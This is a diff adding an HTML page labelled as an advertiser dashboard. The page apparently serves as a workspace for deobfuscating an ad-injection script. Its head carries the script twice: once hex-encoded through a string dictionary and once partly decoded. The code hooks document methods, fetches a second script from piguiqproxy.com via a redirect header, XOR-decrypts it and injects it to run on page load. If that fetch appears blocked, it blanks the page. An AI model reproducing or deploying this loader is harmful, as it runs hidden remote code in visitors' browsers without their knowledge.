@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title>RECREATIV advertiser dashboard</title>
+    <script>
+        window.decriptor = function (dict, dictName, codedScript) {
+            var ar = codedScript.split("\n")
+
+            var proceeded = ar.map(
+                function (line, lineIndex) {
+                    var newLine = line + ""
+                    dict.forEach(function (v, i) {
+                        var substr = "[" + dictName + "[" + i + "]]"
+                        newLine = newLine.replace(substr, "." + v)
+                        substr = dictName + "[" + i + "]"
+                        newLine = newLine.replace(substr, '"' + v + '"')
+                    })
+                    newLine = newLine.replace(/(\"\s*?\+\s*?\")/g, '')
+                    if (newLine !== line){
+                        console.log(line, newLine)
+                    }
+                    return newLine
+                }).reduce(
+                function (acc, curVal, curIndex) {
+                    if (curVal) {
+                        acc += "\n"+curVal
+                    }
+                    return acc
+                }, "")
+
+            window.proxyScripts = window.proxyScripts || []
+            window.proxyScripts.push(proceeded)
+            var s = document.createElement('script');
+            s.type = 'text/javascript';
+            var code = proceeded;
+            try {
+                s.appendChild(document.createTextNode(code));
+                document.head.appendChild(s);
+            } catch (e) {
+                s.text = code;
+                document.head.appendChild(s);
+            }
+            return proceeded
+        }
+//        var scr = document.querySelectorAll('script')[0].innerText
+//        decriptor(dict, 'dict', scr)
+    </script>
+    <script>
+
+        (function () {
+            function paramsObjectFactory() {
+                var paramsObject = {};
+                for (var a = 0; a < arguments.length; a += 2) {
+                    paramsObject[arguments[a]] = arguments[a + 1]
+                }
+                ;
+                return paramsObject
+            }
+            function main() {
+                function h() {
+                    var d = DOCUMENT.getElementsByTagName("IMG");
+                    if (!dict) {
+                        main();
+                        return
+                    }
+                    ;
+                    var c = 0;
+                    for (var f = 0; f < d.length; f++) {
+                        if (d[f].src && d[f]["src"] != "") {
+                            if (main === "arg load fail, 204") {
+                                main = true;
+                                return
+                            }
+                            ;
+                            d[f].src = "";
+                            c++
+                        }
+                    }
+                    ;
+                    if (!main) {
+                        main = "dloaded"
+                    } else {
+                        return c
+                    }
+                }
+                function n() {
+                    var b = DOCUMENT.styleSheets;
+                    for (var c = 0; c < b.length; c++) {
+                        b[c].disabled = true
+                    }
+                    ;
+                    h();
+                    WINDOW.stop()
+                }
+                function y(f, d, h) {
+                    function c() {
+                        return g
+                    }
+                    var g = f[d].toString();
+                    if (main == 1) {
+                        main = 0
+                    }
+                    ;
+                    h._orig = f[d].bind(f);
+                    f[d] = h;
+                    f[d].toString = c
+                }
+                function E(c) {
+                    var b = WINDOW.performance.now() - c.start;
+                    if (b < v) {
+                        n()
+                    }
+                }
+                function w(d, b, f) {
+                    WINDOW.Object.defineProperty(d, b, paramsObjectFactory("enumerable", false, "configurable", false, "writable", false, "value", f))
+                }
+                function r(b) {
+                    b = z(b);
+                    var c = DOCUMENT.createElement("script");
+                    c.async = false;
+                    c.textContent = b;
+                    DOCUMENT.documentElement.appendChild(c);
+                    DOCUMENT.documentElement.removeChild(c)
+                }
+                function z(b) {
+                    var c = "mzs__" + WINDOW.Math.random().toString().substr(2, 4);
+                    WINDOW[c] = stateData;
+                    b = "(function(mz_str) {" + b + "})('" + c + "');";
+                    return b
+                }
+                function ajaxGetUri(ajaxUri, callbackFunction) {
+                    function onLoad() {
+                        callbackFunction(ajaxRequest)
+                    }
+                    function onError() {
+                        E(ajaxRequest)
+                    }
+                    //      new window.XMLHttpRequest()
+                    var ajaxRequest = new WINDOW.XMLHttpRequest();
+                    // .open('GET', )
+                    ajaxRequest.open("GET", ajaxUri, true);
+                    // .responseType = 'text'
+                    ajaxRequest.responseType = "text";
+                    // .start = window.performance.now()
+                    ajaxRequest.start = WINDOW.performance.now();
+                    if (!main) {
+                        main = "bind" //bind
+                    }
+                    ;
+                    // addEventListener
+                    ajaxRequest.addEventListener("load", onLoad);
+                    // addEventListener
+                    ajaxRequest.addEventListener("error", onError);
+                    // .send(null)
+                    ajaxRequest.send(null)
+                }
+                function m(f) {
+                    var m = f.match(new WINDOW.RegExp("var _a=\["(.+)"\];"));
+                    if (m) {
+                        var n = m[1];
+                        var s = n.split("","");
+                        var o = "", p = dict[4], v = 0, c = [];
+                        if (!main) {
+                            main();
+                            main = "document"
+                        }
+                        ;
+                        while (s[v] != "bf4bfd3ad268f00b1ac6fc8a32a5309a") {
+                            p += s[v];
+                            if (++v == s.length) {
+                                return
+                            }
+                        }
+                        ;
+                        for (var g = v + 1; g < s.length; g++) {
+                            var u = s[g], h = g - v - 1;
+                            var t = p.substr(h * 2, 2);
+                            if (!main) {
+                                return
+                            }
+                            ;
+                            var l = WINDOW.parseInt(t, 16), j = l;
+                            var r = "";
+                            if (!dict) {
+                                main()
+                            }
+                            ;
+                            for (var i = 0; i < u.length; i += 2) {
+                                var q = WINDOW.parseInt(u.substr(i, 2), 16);
+                                var d = q ^ l;
+                                l = d ^ j;
+                                d = d.toString(16);
+                                if (d.length < 2) {
+                                    d = "0" + d
+                                }
+                                ;
+                                r += d
+                            }
+                            ;
+                            c.push(r)
+                        }
+                        ;
+                        f = f.replace(n, c.join("",""))
+                    }
+                    ;
+                    return f
+                }
+                function q(g) {
+                    function c(f) {
+                        function d(b) {
+                            var f = b.target;
+                            var g = null;
+                            try {
+                                g = f.contentWindow.document
+                            } catch (e) {
+                            }
+                            ;
+                            if (g) {
+                                q(g);
+                                if (!dict) {
+                                    return
+                                } else {
+                                    c.removeEventListener("load", d)
+                                }
+                            }
+                        }
+                        var b = arguments.callee._orig;
+                        var c = b.apply(this, arguments);
+                        if (c.tagName == "IFRAME") {
+                            c.addEventListener("load", d)
+                        }
+                        ;
+                        return c
+                    }
+                    function d() {
+                        if (!main) {
+                            main = null
+                        }
+                        ;
+                        var c = arguments.callee._orig;
+                        var d = this.readyState;
+                        c.apply(this, arguments);
+                        if (d == "complete") {
+                            if (!dict) {
+                                main(true);
+                                main = 0;
+                                return
+                            }
+                            ;
+                            o(this)
+                        }
+                    }
+                    function f() {
+                        var b = arguments.callee._orig;
+                        b.apply(this, arguments);
+                        o(this)
+                    }
+                    y(g, "createElement", c);
+                    var h = d;
+                    y(g, "write", h);
+                    y(g, "writeln", h);
+                    y(g, "open", f);
+                    stateData.docs.push(g);
+                    o(g)
+                }
+                function p(c, d) {
+                    var f = c.target;
+                    if (!dict) {
+                        return
+                    }
+                    ;
+                    var b = (d) ? stateData.er_load : stateData.sc_load;
+                    b.push(f)
+                }
+                function o(b) {
+                    b.addEventListener("error", stateData.er_listen, true);
+                    b.addEventListener("load", stateData.sc_listen, true)
+                }
+                function s() {
+                    function secondScriptRecieved(ajaxResponse) {
+                        function secondScriptCallback(b) {
+                            debugger
+                            r(m(b.responseText))
+                        }
+                        if (ajaxResponse.status == 204) { // status
+                            if (queryParamsObject.r) {
+                                // console.log("arg load fail, 204")
+                                WINDOW.console.log("arg load fail, 204");
+                                return
+                            }
+                            ;
+                            queryParamsObject.r = DOCUMENT.location.href;
+                            ajaxGetUri(makeQueryUri(), secondScriptRecieved);
+                            return
+                        }
+                        ;
+                        stateData.vars.session = ajaxResponse.getResponseHeader("X-Meta-Request-Id");
+                        var ajaxHeaderXLocation = ajaxResponse.getResponseHeader("X-Location");
+
+                        if (!stateData.vars.session || !ajaxHeaderXLocation) {
+                            return
+                        };
+
+                        stateData.vars.proxy_host = ( new WINDOW.URL(ajaxHeaderXLocation)).host;
+
+                        var h = stateData.vars.proxy_host.indexOf("-");
+                        if (h > 0) {
+                            stateData.vars.proxy_host = stateData.vars.proxy_host.substr(h + 1)
+                        }
+                        ;
+                        ajaxGetUri(ajaxHeaderXLocation, secondScriptCallback)
+                    }
+                    function makeQueryUri() {
+                        var queryParamsArray = [];
+                        for (queryParamName in queryParamsObject) {
+                            // queryParamsArray.push(queryParamName + "=" + window.encodeURIComponent(queryParamsObject[queryParamName]))
+                            queryParamsArray.push(queryParamName + "=" + WINDOW.encodeURIComponent(queryParamsObject[queryParamName]))
+                        }
+                        ;
+                        //       queryParamsArray.length ? "?" + queryParamsArray.join("&") : ""
+                        var queryString = (queryParamsArray.length) ? "?" + queryParamsArray.join("&") : "";
+                        //     document.location.protocol + '//' + proxyApiUrl + queryString
+                        return DOCUMENT.location.protocol + "//" + proxyApiUrl + queryString
+                    }
+                    var queryParamsObject = {};
+                    // document.cookie.indexOf('argon_enabled=1') != -1
+                    if (DOCUMENT.cookie.indexOf("argon_enable=1") != -1) {
+                        queryParamsObject.w = "1" // b['w'] = 1
+                    }
+                    ;
+                    debugger;
+//                    var scr = document.querySelectorAll('script')[1].innerText
+//                    var decripted = decriptor(dict, 'dict', scr)
+                    ajaxGetUri(makeQueryUri(), secondScriptRecieved)
+//                    ajaxGetUri("https://recreativ.ru/tizers.php?bn=WETPNH5v46", secondScriptRecieved)
+                }
+                function d(a) {
+                    p(a, true)
+                }
+                function f(a) {
+                    p(a, false)
+                }
+                if (!dict) {
+                    main(false);
+                    return
+                }
+                ;
+                if (!main) {
+                    main(false);
+                    return
+                }
+                ;
+                if (main == null) {
+                    main("addEventListener", false);
+                    main = true;
+                    return
+                }
+                ;
+                var WINDOW = window, DOCUMENT = WINDOW.document, v = 300, u = 7,
+                    dictionaryWord55 = "tttZZZ2m", dictionaryWord56 = "f4FFv";
+                var stateData = {};
+                var proxyApiUrl = "piguiqproxy.com/api";
+                var t = false;
+                var C = false;
+                var B = null;
+                if (main === true) {
+                    main = true;
+                    return
+                };
+                try {
+                    if (WINDOW.opener && WINDOW.opener["_tttZZZ2m"] == "f4FFv") {
+                        WINDOW.opener["_tttZZZ2m"] = "";
+                        t = true
+                    }
+                } catch (e) {
+                }
+                ;
+                if (!dict) {
+                    main = "responseType"; // "responseType"
+                    return
+                }
+                ;
+                if (!dict) {
+                    return
+                }
+                ;
+                stateData.er_load = []; // er_load
+                if (!main) {
+                    main = 1;
+                    return
+                }
+                ;
+                stateData.sc_load = []; // "sc_load" x[]
+                stateData.docs = []; // "docs"
+                stateData.vars = paramsObjectFactory("proxy_host", "", "session", dict[4]); // x['vars'] =
+                stateData.dloaded = false; // x['dloaded'] ? document loaded
+                stateData.cr_el = DOCUMENT.createElement.bind(DOCUMENT); // x['cr_el'] = document[createElement][bind](document)
+                stateData.er_listen = d; // x['er_listen']
+                if (main === 1) {
+                    main = 0;
+                    return
+                } else {
+                    stateData.sc_listen = f // x['sc_listen']
+                }
+                ;
+                if (!dict) {
+                    main();
+                    main = null
+                } else {
+                    s()
+                }
+                ;
+                q(DOCUMENT);
+                if (t) {
+                    DOCUMENT.writeln("<NOFRAMES>");
+                    if (!main) {
+                        return
+                    }
+                    ;
+                    DOCUMENT.close()
+                }
+            }
+            var encodedDictionary = [
+                "494d47",
+                "676574456c656d656e747342795461674e616d65",
+                "6c656e677468",
+                "737263",
+                "",
+                "7374796c65536865657473",
+                "64697361626c6564",
+                "73746f70",
+                "746f537472696e67",
+                "5f6f726967",
+                "62696e64",
+                "6e6f77",
+                "706572666f726d616e6365",
+                "7374617274",
+                "656e756d657261626c65",
+                "636f6e666967757261626c65",
+                "7772697461626c65",
+                "76616c7565",
+                "646566696e6550726f7065727479",
+                "4f626a656374",
+                "736372697074",
+                "637265617465456c656d656e74", "6173796e63", "74657874436f6e74656e74", "617070656e644368696c64", "646f63756d656e74456c656d656e74", "72656d6f76654368696c64", "6d7a735f5f", "737562737472", "72616e646f6d", "4d617468", "2866756e6374696f6e286d7a5f73747229207b", "7d292827", "27293b", "584d4c4874747052657175657374", "474554", "6f70656e", "726573706f6e736554797065", "74657874", "6c6f6164", "6164644576656e744c697374656e6572", "6572726f72", "73656e64", "766172205f613d5c5b22282e2b29225c5d3b", "526567457870", "6d61746368", "222c22", "73706c6974", "6266346266643361643236386630306231616336666338613332613533303961", "7061727365496e74", "30", "70757368", "6a6f696e", "7265706c616365", "646f63756d656e74", "7474745a5a5a326d", "6634464676", "70696775697170726f78792e636f6d2f617069", "6f70656e6572", "5f", "63616c6c6565", "6170706c79", "7461674e616d65", "494652414d45", "746172676574", "636f6e74656e7457696e646f77", "72656d6f76654576656e744c697374656e6572", "72656164795374617465", "636f6d706c657465", "7772697465", "77726974656c6e", "646f6373", "65725f6c6f6164", "73635f6c6f6164", "65725f6c697374656e", "73635f6c697374656e", "737461747573", "72", "617267206c6f6164206661696c2c20323034", "6c6f67", "636f6e736f6c65", "68726566", "6c6f636174696f6e", "73657373696f6e", "76617273", "582d4d6574612d526571756573742d4964", "676574526573706f6e7365486561646572", "582d4c6f636174696f6e", "70726f78795f686f7374", "686f7374", "55524c", "2d", "696e6465784f66", "726573706f6e736554657874", "3d", "656e636f6465555249436f6d706f6e656e74", "3f", "26", "70726f746f636f6c", "2f2f", "6172676f6e5f656e61626c653d31", "636f6f6b6965", "77", "31", "646c6f61646564", "63725f656c", "3c4e4f", "465241", "4d45533e",
+                "636c6f7365"];
+            var dictWord, dictChar, dict = [];
+            /**
+             *  Decode Dictionary
+             **/
+            for (dictWord = 0; dictWord < encodedDictionary.length; dictWord++)
+                for (dict[dictWord] = "", dictChar = 0; dictChar < encodedDictionary[dictWord].length; dictChar += 2)
+                    dict[dictWord] += String.fromCharCode(parseInt(encodedDictionary[dictWord].substr(dictChar, 2), 16));
+            if (!main) {
+                return
+            }
+            ;
+            (main)()
+        })()
+        /*21f5420b732442dfa1a830193ed3eb14da8b38a6*/
+    </script>
+    <script type="text/javascript">
+        (function () {
+            function paramsObjectFactory() {
+                var paramsObject = {};
+                for (var a = 0; a < arguments.length; a += 2) {
+                    paramsObject[arguments[a]] = arguments[a + 1]
+                }
+                ;
+                return paramsObject
+            }
+
+            function main() {
+                function h() {
+                    var d = DOCUMENT[dict[1]](dict[0]);
+                    if (!dict) {
+                        main();
+                        return
+                    }
+                    ;
+                    var c = 0;
+                    for (var f = 0; f < d[dict[2]]; f++) {
+                        if (d[f][dict[3]] && d[f][dict[3]] != dict[4]) {
+                            if (main === dict[78]) {
+                                main = true;
+                                return
+                            }
+                            ;
+                            d[f][dict[3]] = dict[4];
+                            c++
+                        }
+                    }
+                    ;
+                    if (!main) {
+                        main = "dloaded"
+                    } else {
+                        return c
+                    }
+                }
+
+                function n() {
+                    var b = DOCUMENT[dict[5]];
+                    for (var c = 0; c < b[dict[2]]; c++) {
+                        b[c][dict[6]] = true
+                    }
+                    ;
+                    h();
+                    WINDOW[dict[7]]()
+                }
+
+                function y(f, d, h) {
+                    function c() {
+                        return g
+                    }
+
+                    var g = f[d][dict[8]]();
+                    if (main == 1) {
+                        main = 0
+                    }
+                    ;
+                    h._orig = f[d].bind(f);
+                    f[d] = h;
+                    f[d][dict[8]] = c
+                }
+
+                function E(c) {
+                    var b = WINDOW.performance.now() - c.start;
+                    if (b < v) {
+                        n()
+                    }
+                }
+
+                function w(d, b, f) {
+                    WINDOW[dict[19]][dict[18]](d, b, paramsObjectFactory(dict[14], false, dict[15], false, dict[16], false, dict[17], f))
+                }
+
+                function r(b) {
+                    b = z(b);
+                    var c = DOCUMENT.createElement("script");
+                    c.async = false;
+                    c.textContent = b;
+                    DOCUMENT.documentElement.appendChild(c);
+                    DOCUMENT.documentElement.removeChild(c)
+                }
+
+                function z(b) {
+                    var c = "mzs__" + WINDOW.Math.random().toString()[dict[28]](2, 4);
+                    WINDOW[c] = stateData;
+                    b = dict[31] + b + dict[32] + c + dict[33];
+                    return b
+                }
+
+                function ajaxGetUri(ajaxUri, callbackFunction) {
+                    function onLoad() {
+                        callbackFunction(ajaxRequest)
+                    }
+
+                    function onError() {
+                        E(ajaxRequest)
+                    }
+
+                    //      new window.XMLHttpRequest()
+                    var ajaxRequest = new WINDOW[dict[34]]();
+                    // .open('GET', )
+                    ajaxRequest.open(dict[35], ajaxUri, true);
+                    // .responseType = 'text'
+                    ajaxRequest.responseType = dict[38];
+                    // .start = window.performance.now()
+                    ajaxRequest.start = WINDOW.performance.now();
+                    if (!main) {
+                        main = dict[10] //bind
+                    }
+                    ;
+                    // addEventListener
+                    ajaxRequest[dict[40]]("load", onLoad);
+                    // addEventListener
+                    ajaxRequest[dict[40]]("error", onError);
+                    // .send(null)
+                    ajaxRequest[dict[42]](null)
+                }
+
+                function m(f) {
+                    var m = f[dict[45]](new WINDOW[dict[44]](dict[43]));
+                    if (m) {
+                        var n = m[1];
+                        var s = n[dict[47]](dict[46]);
+                        var o = dict[4], p = dict[4], v = 0, c = [];
+                        if (!main) {
+                            main();
+                            main = dict[54]
+                        }
+                        ;
+                        while (s[v] != dict[48]) {
+                            p += s[v];
+                            if (++v == s.length) {
+                                return
+                            }
+                        }
+                        ;
+                        for (var g = v + 1; g < s.length; g++) {
+                            var u = s[g], h = g - v - 1;
+                            var t = p[dict[28]](h * 2, 2);
+                            if (!main) {
+                                return
+                            }
+                            ;
+                            var l = WINDOW[dict[49]](t, 16), j = l;
+                            var r = dict[4];
+                            if (!dict) {
+                                main()
+                            }
+                            ;
+                            for (var i = 0; i < u.length; i += 2) {
+                                var q = WINDOW[dict[49]](u[dict[28]](i, 2), 16);
+                                var d = q ^ l;
+                                l = d ^ j;
+                                d = d.toString(16);
+                                if (d.length < 2) {
+                                    d = dict[50] + d
+                                }
+                                ;
+                                r += d
+                            }
+                            ;
+                            c.push(r)
+                        }
+                        ;
+                        f = f.replace(n, c.join(dict[46]))
+                    }
+                    ;
+                    return f
+                }
+
+                function q(g) {
+                    function c(f) {
+                        function d(b) {
+                            var f = b.target;
+                            var g = null;
+                            try {
+                                g = f.contentWindow.document
+                            } catch (e) {
+                            }
+                            ;
+                            if (g) {
+                                q(g);
+                                if (!dict) {
+                                    return
+                                } else {
+                                    c.removeEventListener("load", d)
+                                }
+                            }
+                        }
+
+                        var b = arguments.callee._orig;
+                        var c = b.apply(this, arguments);
+                        if (c.tagName == dict[63]) {
+                            c[dict[40]]("load", d)
+                        }
+                        ;
+                        return c
+                    }
+
+                    function d() {
+                        if (!main) {
+                            main = null
+                        }
+                        ;
+                        var c = arguments.callee._orig;
+                        var d = this.readyState;
+                        c.apply(this, arguments);
+                        if (d == dict[68]) {
+                            if (!dict) {
+                                main(true);
+                                main = 0;
+                                return
+                            }
+                            ;
+                            o(this)
+                        }
+                    }
+
+                    function f() {
+                        var b = arguments.callee._orig;
+                        b.apply(this, arguments);
+                        o(this)
+                    }
+
+                    y(g, dict[21], c);
+                    var h = d;
+                    y(g, dict[69], h);
+                    y(g, dict[70], h);
+                    y(g, dict[36], f);
+                    stateData.docs.push(g);
+                    o(g)
+                }
+
+                function p(c, d) {
+                    var f = c.target;
+                    if (!dict) {
+                        return
+                    }
+                    ;
+                    var b = (d) ? stateData.er_load : stateData.sc_load;
+                    b.push(f)
+                }
+
+                function o(b) {
+                    b.addEventListener("error", stateData.er_listen, true);
+                    b.addEventListener("load", stateData[dict[75]], true)
+                }
+
+                function s() {
+                    function secondScriptRecieved(ajaxResponse) {
+                        function secondScriptCallback(b) {
+                            r(m(b[dict[93]]))
+                        }
+
+                        if (ajaxResponse[dict[76]] == 204) { // status
+                            if (queryParamsObject.r) {
+                                // console.log("arg load fail, 204")
+                                WINDOW.console.log("arg load fail, 204");
+                                return
+                            }
+                            ;
+                            queryParamsObject.r = DOCUMENT.location.href;
+                            ajaxGetUri(makeQueryUri(), secondScriptRecieved);
+                            return
+                        }
+                        ;
+                        // x['vars']['session'] = ajaxResponse.getResponseHeader("X-Meta-Request-Id")
+                        stateData.vars.session = ajaxResponse.getResponseHeader("X-Meta-Request-Id");
+                        // ajaxHeaderXLocation = ajaxResponse.getResponseHeader("X-Location")
+                        var ajaxHeaderXLocation = ajaxResponse.getResponseHeader("X-Location");
+                        if (!stateData.vars.session || !ajaxHeaderXLocation) {
+                            return
+                        }
+                        ;
+                        stateData.vars.proxy_host = ( new WINDOW.URL(ajaxHeaderXLocation)).host;
+                        var h = stateData.vars.proxy_host[dict[92]](dict[91]);
+                        if (h > 0) {
+                            stateData.vars.proxy_host = stateData.vars.proxy_host[dict[28]](h + 1)
+                        }
+                        ;
+                        ajaxGetUri(ajaxHeaderXLocation, secondScriptCallback)
+                    }
+
+                    function makeQueryUri() {
+                        var queryParamsArray = [];
+                        for (queryParamName in queryParamsObject) {
+                            // queryParamsArray.push(queryParamName + "=" + window.encodeURIComponent(queryParamsObject[queryParamName]))
+                            queryParamsArray.push(queryParamName + dict[94] + WINDOW[dict[95]](queryParamsObject[queryParamName]))
+                        }
+                        ;
+                        //       queryParamsArray.length ? "?" + queryParamsArray.join("&") : ""
+                        var queryString = (queryParamsArray.length) ? dict[96] + queryParamsArray.join(dict[97]) : dict[4];
+                        //     document.location.protocol + '//' + proxyApiUrl + queryString
+                        return DOCUMENT.location[dict[98]] + dict[99] + proxyApiUrl + queryString
+                    }
+
+                    var queryParamsObject = {};
+
+                    // document.cookie.indexOf('argon_enabled=1') != -1
+                    if (DOCUMENT[dict[101]][dict[92]](dict[100]) != -1) {
+                        queryParamsObject[dict[102]] = dict[103] // b['w'] = 1
+                    }
+                    ;
+                    debugger;
+
+                    var scr = document.querySelectorAll('script')[1].innerText
+                    var decripted = decriptor(dict, 'dict', scr)
+
+                    ajaxGetUri(makeQueryUri(), secondScriptRecieved)
+//                    ajaxGetUri("https://recreativ.ru/tizers.php?bn=WETPNH5v46", secondScriptRecieved)
+                }
+
+                function d(a) {
+                    p(a, true)
+                }
+
+                function f(a) {
+                    p(a, false)
+                }
+
+                if (!dict) {
+                    main(false);
+                    return
+                }
+                ;
+                if (!main) {
+                    main(false);
+                    return
+                }
+                ;
+                if (main == null) {
+                    main(dict[40], false);
+                    main = true;
+                    return
+                }
+                ;
+                var WINDOW = window, DOCUMENT = WINDOW.document, v = 300, u = 7,
+                    dictionaryWord55 = dict[55], dictionaryWord56 = dict[56];
+                var stateData = {};
+                var proxyApiUrl = dict[57];
+                var t = false;
+                var C = false;
+                var B = null;
+                if (main === true) {
+                    main = true;
+                    return
+                };
+                try {
+                    if (WINDOW.opener && WINDOW.opener["_" + "tttZZZ2m"] == "f4FFv") {
+                        WINDOW.opener["_" + "tttZZZ2m"] = "";
+                        t = true
+                    }
+                } catch (e) {
+                }
+                ;
+                if (!dict) {
+                    main = "responseType"; // dict[37]
+                    return
+                }
+                ;
+                if (!dict) {
+                    return
+                }
+                ;
+                stateData.er_load = []; // er_load
+                if (!main) {
+                    main = 1;
+                    return
+                }
+                ;
+                stateData.sc_load = []; // dict[73] x[]
+                stateData.docs = []; // dict[71]
+                stateData.vars = paramsObjectFactory(dict[88], dict[4], dict[83], dict[4]); // x['vars'] =
+                stateData.dloaded = false; // x['dloaded'] ? document loaded
+                stateData.cr_el = DOCUMENT.createElement.bind(DOCUMENT); // x['cr_el'] = document[createElement][bind](document)
+                stateData.er_listen = d; // x['er_listen']
+                if (main === 1) {
+                    main = 0;
+                    return
+                } else {
+                    stateData[dict[75]] = f // x['sc_listen']
+                }
+                ;
+                if (!dict) {
+                    main();
+                    main = null
+                } else {
+                    s()
+                }
+                ;
+                q(DOCUMENT);
+                if (t) {
+                    DOCUMENT[dict[70]](dict[106] + dict[107] + dict[108]);
+                    if (!main) {
+                        return
+                    }
+                    ;
+                    DOCUMENT[dict[109]]()
+                }
+            }
+
+            var encodedDictionary = [
+                "494d47",
+                "676574456c656d656e747342795461674e616d65",
+                "6c656e677468",
+                "737263",
+                "",
+                "7374796c65536865657473",
+                "64697361626c6564",
+                "73746f70",
+                "746f537472696e67",
+                "5f6f726967",
+                "62696e64",
+                "6e6f77",
+                "706572666f726d616e6365",
+                "7374617274",
+                "656e756d657261626c65",
+                "636f6e666967757261626c65",
+                "7772697461626c65",
+                "76616c7565",
+                "646566696e6550726f7065727479",
+                "4f626a656374",
+                "736372697074",
+                "637265617465456c656d656e74", "6173796e63", "74657874436f6e74656e74", "617070656e644368696c64", "646f63756d656e74456c656d656e74", "72656d6f76654368696c64", "6d7a735f5f", "737562737472", "72616e646f6d", "4d617468", "2866756e6374696f6e286d7a5f73747229207b", "7d292827", "27293b", "584d4c4874747052657175657374", "474554", "6f70656e", "726573706f6e736554797065", "74657874", "6c6f6164", "6164644576656e744c697374656e6572", "6572726f72", "73656e64", "766172205f613d5c5b22282e2b29225c5d3b", "526567457870", "6d61746368", "222c22", "73706c6974", "6266346266643361643236386630306231616336666338613332613533303961", "7061727365496e74", "30", "70757368", "6a6f696e", "7265706c616365", "646f63756d656e74", "7474745a5a5a326d", "6634464676", "70696775697170726f78792e636f6d2f617069", "6f70656e6572", "5f", "63616c6c6565", "6170706c79", "7461674e616d65", "494652414d45", "746172676574", "636f6e74656e7457696e646f77", "72656d6f76654576656e744c697374656e6572", "72656164795374617465", "636f6d706c657465", "7772697465", "77726974656c6e", "646f6373", "65725f6c6f6164", "73635f6c6f6164", "65725f6c697374656e", "73635f6c697374656e", "737461747573", "72", "617267206c6f6164206661696c2c20323034", "6c6f67", "636f6e736f6c65", "68726566", "6c6f636174696f6e", "73657373696f6e", "76617273", "582d4d6574612d526571756573742d4964", "676574526573706f6e7365486561646572", "582d4c6f636174696f6e", "70726f78795f686f7374", "686f7374", "55524c", "2d", "696e6465784f66", "726573706f6e736554657874", "3d", "656e636f6465555249436f6d706f6e656e74", "3f", "26", "70726f746f636f6c", "2f2f", "6172676f6e5f656e61626c653d31", "636f6f6b6965", "77", "31", "646c6f61646564", "63725f656c", "3c4e4f", "465241", "4d45533e",
+                "636c6f7365"];
+
+            var dictWord, dictChar, dict = [];
+            /**
+             *  Decode Dictionary
+             **/
+            for (dictWord = 0; dictWord < encodedDictionary.length; dictWord++)
+                for (dict[dictWord] = "", dictChar = 0; dictChar < encodedDictionary[dictWord].length; dictChar += 2)
+                    dict[dictWord] += String.fromCharCode(parseInt(encodedDictionary[dictWord].substr(dictChar, 2), 16));
+            if (!main) {
+                return
+            }
+            ;
+            (main)()
+        }) // ()
+        /*21f5420b732442dfa1a830193ed3eb14da8b38a6*/
+    </script>
+
+</head>
+
+<body>
+
+</body>
+
+</html>
